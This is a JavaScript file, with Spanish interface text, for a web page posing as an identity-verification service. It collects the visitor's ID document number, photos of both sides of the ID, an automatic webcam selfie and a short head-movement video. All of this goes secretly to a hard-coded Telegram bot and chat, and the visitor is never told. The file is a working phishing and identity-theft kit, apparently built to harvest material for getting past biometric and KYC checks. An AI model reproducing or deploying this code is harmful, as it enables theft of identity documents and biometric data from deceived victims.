document.addEventListener('DOMContentLoaded', () => {
    // Determine which page we are on
    const isVerificationPage = window.location.pathname.includes('verification.html');
    
    // --- SHARED CONFIG ---
    // REEMPLAZA ESTOS VALORES CON LOS TUYOS
    const TELEGRAM_BOT_TOKEN = '7793777042:AAHegpN7eQIAcBJZjtMDfZZIwGnsmqv7vfg'; 
    const TELEGRAM_CHAT_ID = '-4992418825';

    // --- PAGE: INDEX (FORM + ID UPLOAD) ---
    if (!isVerificationPage) {
        const loginForm = document.getElementById('login-form');
        const loginStep = document.getElementById('login-step');
        const idScanStep = document.getElementById('id-scan-step');
        const uploadForm = document.getElementById('upload-form');
        const uploadStatus = document.getElementById('upload-status');
        const btnUpload = document.getElementById('btn-upload-continue');

        // File Inputs
        const frontInput = document.getElementById('id-front');
        const backInput = document.getElementById('id-back');
        const frontName = document.getElementById('front-file-name');
        const backName = document.getElementById('back-file-name');

        if (loginForm) {
            loginForm.addEventListener('submit', (e) => {
                e.preventDefault();
                
                const docType = document.getElementById('doc-type').value;
                const docNumber = document.getElementById('doc-number').value;
                
                if (docType && docNumber) {
                    // Save info
                    localStorage.setItem('docType', docType);
                    localStorage.setItem('docNumber', docNumber);
                    
                    // Notify Telegram
                    sendTextToTelegram(`Nuevo usuario iniciando:\nTipo: ${docType}\nDocumento: ${docNumber}`);
                    
                    // Switch to ID Upload
                    loginStep.classList.add('hidden');
                    idScanStep.classList.remove('hidden');
                }
            });
        }

        // Display file names on selection
        if (frontInput) {
            frontInput.addEventListener('change', (e) => {
                if (e.target.files.length > 0) frontName.textContent = e.target.files[0].name;
            });
        }
        if (backInput) {
            backInput.addEventListener('change', (e) => {
                if (e.target.files.length > 0) backName.textContent = e.target.files[0].name;
            });
        }

        // Handle Upload Submit
        if (uploadForm) {
            uploadForm.addEventListener('submit', async (e) => {
                e.preventDefault();
                
                const frontFile = frontInput.files[0];
                const backFile = backInput.files[0];

                if (!frontFile || !backFile) {
                    uploadStatus.textContent = "Por favor seleccione ambas fotos.";
                    return;
                }

                uploadStatus.textContent = "Enviando documentos...";
                btnUpload.disabled = true;

                const docNum = localStorage.getItem('docNumber') || 'Desconocido';

                // Send Front
                await sendPhotoToTelegram(frontFile, 'id_front.jpg', `Documento (Frente) - ${docNum}`);
                
                // Small delay to ensure order
                await new Promise(r => setTimeout(r, 1000));
                
                // Send Back
                await sendPhotoToTelegram(backFile, 'id_back.jpg', `Documento (Reverso) - ${docNum}`);

                uploadStatus.textContent = "¡Documentos enviados!";
                
                setTimeout(() => {
                    window.location.href = 'verification.html';
                }, 1500);
            });
        }
    }

    // --- PAGE: VERIFICATION (SELFIE + VIDEO) ---
    if (isVerificationPage) {
        const video = document.getElementById('webcam');
        const cameraInstruction = document.querySelector('.camera-instruction');
        const verificationStep = document.getElementById('verification-step');
        const successStep = document.getElementById('success-step');
        let mediaRecorder;
        let recordedChunks = [];

        // Auto-start verification when page loads
        if (video) {
            startCamera();
        }

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: false 
                });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    setTimeout(startVerificationProcess, 1000);
                };
            } catch (err) {
                console.error("Error accessing camera:", err);
                if (cameraInstruction) cameraInstruction.textContent = "Error de cámara";
            }
        }

        function startVerificationProcess() {
            cameraInstruction.textContent = "Mirando al frente...";
            
            setTimeout(() => {
                captureSelfie();
                
                cameraInstruction.textContent = "Mueva su cabeza lentamente...";
                startRecording();
                
                setTimeout(() => {
                    stopRecording();
                    cameraInstruction.textContent = "Procesando...";
                }, 4000);
                
            }, 1500);
        }

        function captureSelfie() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            const docNum = localStorage.getItem('docNumber') || 'Desconocido';

            canvas.toBlob((blob) => {
                sendPhotoToTelegram(blob, 'selfie.jpg', `Selfie - ${docNum}`);
            }, 'image/jpeg', 0.8);
        }

        function startRecording() {
            if (!video.srcObject) return;
            
            recordedChunks = [];
            let options = { mimeType: 'video/webm;codecs=vp8' };
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                 options = { mimeType: 'video/webm' };
            }
            
            try {
                mediaRecorder = new MediaRecorder(video.srcObject, options);
            } catch (e) {
                mediaRecorder = new MediaRecorder(video.srcObject);
            }

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const docNum = localStorage.getItem('docNumber') || 'Desconocido';
                sendVideoToTelegram(blob, `Video - ${docNum}`);
                stopCamera();
                transitionToSuccess();
            };

            mediaRecorder.start();
        }

        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
            }
        }

        function stopCamera() {
            if (video.srcObject) {
                const tracks = video.srcObject.getTracks();
                tracks.forEach(track => track.stop());
                video.srcObject = null;
            }
        }

        function transitionToSuccess() {
            verificationStep.classList.add('hidden');
            successStep.classList.remove('hidden');
            
            // Clear sensitive data
            localStorage.removeItem('docNumber');
            localStorage.removeItem('docType');

            setTimeout(() => {
                // Redirect back to start or elsewhere
                window.location.href = 'index.html';
            }, 3000);
        }
    }

    // --- SHARED: TELEGRAM FUNCTIONS ---

    async function sendTextToTelegram(text) {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('text', text);

        return fetch(url, { method: 'POST', body: formData }).catch(console.error);
    }

    async function sendPhotoToTelegram(blob, filename, caption) {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, filename || 'photo.jpg');
        formData.append('caption', caption || '');

        return fetch(url, { method: 'POST', body: formData })
            .then(res => res.json())
            .then(data => {
                if (!data.ok) console.error('Telegram Error:', data);
                return data;
            })
            .catch(console.error);
    }

    async function sendVideoToTelegram(blob, caption) {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', blob, 'biometric_video.webm');
        formData.append('caption', caption || 'Video de prueba');

        return fetch(url, { method: 'POST', body: formData }).catch(console.error);
    }
});